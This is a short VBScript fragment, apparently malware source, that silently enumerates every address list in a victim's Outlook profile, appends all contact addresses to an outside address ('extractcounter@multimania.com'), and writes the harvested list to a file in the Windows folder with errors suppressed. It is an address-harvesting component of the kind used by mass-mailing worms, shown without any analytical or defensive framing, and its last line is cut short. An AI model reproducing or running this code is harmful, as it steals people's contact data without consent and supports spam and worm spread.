On Error Resume Next
Set f=CreateObject("Scripting.FileSystemObject")
Set win=f.GetSpecialFolder(0)
Set c=f.CreateTextFile(win&"\Outlook_Addr.txt")
c.Close
Set out=CreateObject("Outlook.Application")
Set mapi=out.GetNameSpace("MAPI")
adr="extractcounter@multimania.com"
For Each mail in mapi.AddressLists
If mail.AddressEntries.Count <> 0 Then
For O=1 To mail.AddressEntries.Count
adr=adr &";"& mail.AddressEntries(O).Address
Next
End If
Next
adr=adr &";#"

Set c=f.OpenTextFile(win&"\Outlook_Addr.txt",2)
c.WriteLine adr
c.Close
wscript  